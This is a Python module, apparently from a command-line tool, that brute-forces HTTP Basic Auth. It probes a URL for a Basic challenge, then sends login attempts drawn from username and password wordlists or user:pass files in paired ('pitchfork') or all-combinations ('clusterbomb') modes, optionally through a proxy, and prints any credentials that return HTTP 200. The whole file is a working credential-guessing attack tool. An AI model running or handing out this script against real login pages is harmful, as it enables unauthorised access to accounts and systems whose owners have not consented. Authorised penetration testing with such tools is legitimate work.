from __future__ import annotations

import itertools
from argparse import Namespace
from pathlib import Path
from typing import Iterable

import requests
from requests import Response
from requests.auth import HTTPBasicAuth


DEFAULT_TIMEOUT = 15.0


def _proxy_dict(proxy: str | None) -> dict[str, str] | None:
    if not proxy:
        return None
    return {"http": proxy, "https": proxy}


def _read_lines(path: Path) -> list[str]:
    text = path.read_text(encoding="utf-8", errors="replace")
    return [line.strip() for line in text.splitlines() if line.strip()]


def check_basic_auth(
    url: str,
    timeout: float = DEFAULT_TIMEOUT,
    proxies: dict[str, str] | None = None,
) -> bool:
    try:
        r = requests.get(
            url,
            timeout=timeout,
            allow_redirects=False,
            proxies=proxies,
        )
    except requests.RequestException:
        return False
    if r.status_code != 401:
        return False
    www_auth = r.headers.get("WWW-Authenticate") or ""
    return "basic" in www_auth.lower()


def try_login(
    url: str,
    username: str,
    password: str,
    timeout: float = DEFAULT_TIMEOUT,
    proxies: dict[str, str] | None = None,
) -> requests.Response:
    return requests.get(
        url,
        auth=HTTPBasicAuth(username, password),
        timeout=timeout,
        allow_redirects=False,
        proxies=proxies,
    )


def pitchfork(
    url: str,
    usernames: Iterable[str],
    passwords: Iterable[str],
    timeout: float = DEFAULT_TIMEOUT,
    proxies: dict[str, str] | None = None,
) -> list[tuple[str, str, Response | None, str | None]]:
    u = list(usernames)
    p = list(passwords)
    if not u or not p:
        return []
    n = min(len(u), len(p))
    results: list[tuple[str, str, Response | None, str | None]] = []
    for i in range(n):
        try:
            resp = try_login(url, u[i], p[i], timeout=timeout, proxies=proxies)
            results.append((u[i], p[i], resp, None))
        except requests.RequestException as e:
            results.append((u[i], p[i], None, str(e)))
    return results


def clusterbomb(
    url: str,
    usernames: Iterable[str],
    passwords: Iterable[str],
    timeout: float = DEFAULT_TIMEOUT,
    proxies: dict[str, str] | None = None,
) -> list[tuple[str, str, Response | None, str | None]]:
    results: list[tuple[str, str, Response | None, str | None]] = []
    for user, pw in itertools.product(usernames, passwords):
        try:
            resp = try_login(url, user, pw, timeout=timeout, proxies=proxies)
            results.append((user, pw, resp, None))
        except requests.RequestException as e:
            results.append((user, pw, None, str(e)))
    return results


def userpass_mode(
    url: str,
    combos: Iterable[tuple[str, str]],
    mode: str,
    timeout: float = DEFAULT_TIMEOUT,
    proxies: dict[str, str] | None = None,
) -> list[tuple[str, str, Response | None, str | None]]:
    pairs = list(combos)
    if not pairs:
        return []
    if mode == "pitchfork":
        users = [u for u, _ in pairs]
        pws = [p for _, p in pairs]
        return pitchfork(url, users, pws, timeout=timeout, proxies=proxies)
    users = [u for u, _ in pairs]
    pws = [p for _, p in pairs]
    return clusterbomb(url, users, pws, timeout=timeout, proxies=proxies)


def _emit_success(user: str, pw: str, status: int) -> None:
    print(f"[+] SUCCESS {user}:{pw} (HTTP {status})")


def _emit_probe(ok: bool, url: str) -> None:
    if ok:
        print(f"[*] Target appears to use HTTP Basic Auth: {url}")
    else:
        print(f"[!] Target may not require HTTP Basic Auth (or unreachable): {url}")


def run_attack(args: Namespace) -> int:
    url = args.url
    timeout = float(args.timeout)
    verbose = not args.quiet
    proxies = _proxy_dict(args.proxy)

    uses_basic = check_basic_auth(url, timeout=timeout, proxies=proxies)
    if verbose:
        _emit_probe(uses_basic, url)

    results: list[tuple[str, str, Response | None, str | None]]

    if args.userpass:
        path = Path(args.userpass)
        if not path.is_file():
            print(f"[!] File not found: {path}")
            return 2
        lines = _read_lines(path)
        combos: list[tuple[str, str]] = []
        for line in lines:
            if ":" not in line:
                print(f"[!] Invalid line (expected user:pass): {line!r}")
                return 2
            user, _, rest = line.partition(":")
            combos.append((user, rest))
        results = userpass_mode(
            url, combos, args.mode, timeout=timeout, proxies=proxies
        )
    else:
        if not args.username or not args.password:
            print("[!] Provide --userpass or both --username and --password files.")
            return 2
        up = Path(args.username)
        pp = Path(args.password)
        if not up.is_file() or not pp.is_file():
            print("[!] Username or password file not found.")
            return 2
        users = _read_lines(up)
        pws = _read_lines(pp)
        if args.mode == "pitchfork":
            results = pitchfork(url, users, pws, timeout=timeout, proxies=proxies)
        else:
            results = clusterbomb(
                url, users, pws, timeout=timeout, proxies=proxies
            )

    found = False
    for user, pw, resp, err in results:
        if resp is None:
            if verbose and err:
                print(f"[-] request failed for {user}:{pw} — {err}")
            continue
        if resp.status_code == 200:
            _emit_success(user, pw, resp.status_code)
            found = True

    if not found and verbose:
        print("[*] No credentials returned HTTP 200.")

    return 0 if found else 1
